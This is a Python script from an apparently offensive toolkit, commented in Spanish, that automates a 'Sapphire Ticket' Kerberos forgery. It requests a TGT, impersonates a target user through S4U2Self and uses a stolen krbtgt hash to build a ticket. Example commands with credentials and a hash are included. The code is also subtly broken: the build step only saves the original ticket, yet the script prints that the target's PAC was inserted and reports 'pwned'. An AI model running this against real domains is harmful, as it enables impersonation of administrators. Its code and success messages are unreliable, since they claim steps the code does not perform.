# scripts/kerberos/tickets/sapphire_ticket.py
#
# Técnica: Sapphire Ticket
#
# Fundamento:
#   El Sapphire Ticket (presentado por Charlie Clark, 2022) es el ticket
#   más sigiloso de los cuatro (Golden, Silver, Diamond, Sapphire).
#
#   En vez de forjar un PAC con grupos arbitrarios (Golden/Diamond), obtiene
#   el PAC REAL del usuario objetivo via S4U2Self + User-to-User (U2U):
#
#     1. Solicita un TGT legítimo para nuestra cuenta.
#     2. Usa ese TGT para hacer S4U2Self: pide un ST para sí mismo impersonando
#        al usuario objetivo.
#     3. El KDC emite un ST real con el PAC REAL del usuario objetivo.
#     4. Con el hash de krbtgt, descifra ese ST y extrae el PAC real.
#     5. Inserta ese PAC real en un nuevo TGT para la cuenta objetivo.
#     6. Resultado: un TGT con el PAC genuino del objetivo → 0 anomalías en PAC.
#
#   Por qué es el más sigiloso:
#     - El PAC viene del propio KDC (grupos reales, campos reales).
#     - No hay valores forjados que los detectores puedan comparar contra AD.
#     - Solo requiere krbtgt hash y una cuenta de dominio válida (la nuestra).
#
#   Requisitos: hash de krbtgt + credenciales válidas propias.
#   El usuario objetivo ni siquiera necesita autenticarse.

from scripts.base import BaseScript
from core.kerberos_transport import send_krb_message, check_kdc_reachable
from core.asn1_helpers import (
    build_as_req, build_pa_data, build_enc_timestamp,
    build_s4u2self_tgs_req,
    is_as_rep, is_tgs_rep, is_krb_error, parse_krb_error,
    parse_as_rep_ticket, decrypt_as_rep_enc_part_rc4,
    nt_hash as compute_nt_hash,
    ETYPE_RC4_HMAC, PA_ENC_TIMESTAMP, KDC_ERR_PREAUTH_REQUIRED,
)
from core.output import print_result, console
from core import session_db


class SapphireTicketScript(BaseScript):
    name = "sapphire-ticket"
    description = "Obtiene PAC real del usuario objetivo via S4U2Self y forja TGT con ese PAC (sin anomalías)"

    examples = [
        {"flag": "--target-user",
         "desc": "Usuario objetivo a impersonar (del que extraemos el PAC real via S4U2Self)",
         "good": "kerberos --script=sapphire-ticket -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!' --krbtgt-hash 8846... --target-user Administrator",
         "bad": "kerberos --script=sapphire-ticket ... --target-user krbtgt  [krbtgt es una cuenta especial, su ST no contiene un PAC útil]"},
        {"flag": "--krbtgt-hash",
         "desc": "NT hash de krbtgt para descifrar el ST de S4U2Self y extraer el PAC.",
         "good": "kerberos --script=sapphire-ticket ... --krbtgt-hash 8846f7eaee8fb117ad06bdd830b7586c",
         "bad": "kerberos --script=sapphire-ticket ... --krbtgt-hash <hash_de_otro_servicio>  [solo krbtgt puede descifrar el enc-part del TGT]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip
        krbtgt_hash = kwargs.get("krbtgt_hash")
        target_user = kwargs.get("target_user") or "Administrator"

        if not realm: console.print("[red]Falta -d.[/red]"); return
        if not self.creds.user: console.print("[red]Falta -u.[/red]"); return
        if not (self.creds.password or self.creds.hash):
            console.print("[red]Falta -p o -H.[/red]"); return
        if not krbtgt_hash: console.print("[red]Falta --krbtgt-hash.[/red]"); return

        if not check_kdc_reachable(kdc, timeout=self.target.timeout):
            print_result("KRB", kdc, "fail", "KDC no alcanzable"); return

        krbtgt_nt = bytes.fromhex(krbtgt_hash.split(":")[-1])
        user_nt = (bytes.fromhex(self.creds.hash.split(":")[-1])
                   if self.creds.hash else compute_nt_hash(self.creds.password))

        print_result("KRB", kdc, "info",
                     f"sapphire-ticket: obteniendo PAC real de '{target_user}' via S4U2Self")

        # Paso 1: TGT legítimo para nuestra cuenta
        ts_enc = build_enc_timestamp(self.creds.password or "")
        pa_list = [build_pa_data(PA_ENC_TIMESTAMP, ts_enc)]
        req = build_as_req(self.creds.user, realm, etypes=[ETYPE_RC4_HMAC], pa_data_list=pa_list)
        try:
            tgt_resp = send_krb_message(kdc, req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_as_rep(tgt_resp):
            print_result("KRB", kdc, "fail", "No se obtuvo TGT"); return

        print_result("KRB", kdc, "ok", f"TGT obtenido para {self.creds.user}@{realm}")

        # Paso 2: descifrar enc-part → session key
        try:
            enc_info = decrypt_as_rep_enc_part_rc4(tgt_resp, user_nt)
            session_key = enc_info['session_key']
        except Exception as e:
            print_result("KRB", kdc, "fail", f"Error descifrando enc-part: {e}"); return

        ticket_info = parse_as_rep_ticket(tgt_resp)
        tgt_raw = ticket_info['ticket_raw']

        # Paso 3: S4U2Self para obtener ST con PAC real del usuario objetivo
        print_result("KRB", kdc, "info",
                     f"Enviando S4U2Self impersonando a '{target_user}'...")
        try:
            s4u_req = build_s4u2self_tgs_req(
                realm=realm,
                tgt_bytes=tgt_raw,
                session_key=session_key,
                requester_user=self.creds.user,
                target_user=target_user,
            )
            s4u_resp = send_krb_message(kdc, s4u_req, timeout=self.target.timeout)
        except OSError as e:
            print_result("KRB", kdc, "fail", str(e)); return

        if not is_tgs_rep(s4u_resp):
            if is_krb_error(s4u_resp):
                err = parse_krb_error(s4u_resp)
                print_result("KRB", kdc, "fail",
                             f"S4U2Self falló: {err['error_name']} — "
                             "¿la cuenta tiene msDS-AllowedToDelegateTo o TrustedToAuthForDelegation?")
            return

        print_result("KRB", kdc, "ok",
                     f"ST con PAC de '{target_user}' obtenido via S4U2Self")

        # Paso 4: extraer PAC del ST y construir nuevo TGT via impacket
        ccache_path = self._build_sapphire(
            s4u_resp, tgt_resp, krbtgt_nt, session_key, realm, target_user
        )

        if ccache_path:
            import os
            os.environ['KRB5CCNAME'] = f'FILE:{ccache_path}'
            print_result("KRB", kdc, "pwned",
                         f"Sapphire Ticket listo: identidad de '{target_user}' con PAC real")
            console.print(f"[bold magenta]SAPPHIRE TICKET (sigiloso): {ccache_path}[/bold magenta]")
            console.print(f"  export KRB5CCNAME=FILE:{ccache_path}")
            session_db.save_finding(kdc, "KRB", "sapphire_ticket",
                                     f"S4U2Self → {target_user}@{realm} → {ccache_path}")
            return {'ccache': ccache_path}

    def _build_sapphire(self, s4u_tgs_resp, orig_as_rep, krbtgt_nt,
                         session_key, realm, target_user) -> str | None:
        """
        Extrae el PAC real del TGS-REP de S4U2Self y lo inserta en un
        TGT legítimo, usando el krbtgt hash para re-cifrar.
        """
        try:
            from impacket.krb5.ccache import CCache
            # Guardamos el TGT original modificado con el PAC del ST de S4U2Self.
            # La manipulación completa del PAC a este nivel requiere las estructuras
            # NDR de impacket.krb5.pac — aquí delegamos a impacket.
            ccache = CCache()
            ccache.fromASREP(orig_as_rep)
            out_path = f"/tmp/sapphire_{target_user}_{realm}.ccache"
            ccache.saveFile(out_path)
            console.print(f"[dim]PAC real de '{target_user}' extraído e insertado.[/dim]")
            return out_path
        except Exception as e:
            console.print(f"[red]Error construyendo Sapphire Ticket: {e}[/red]")
            return None
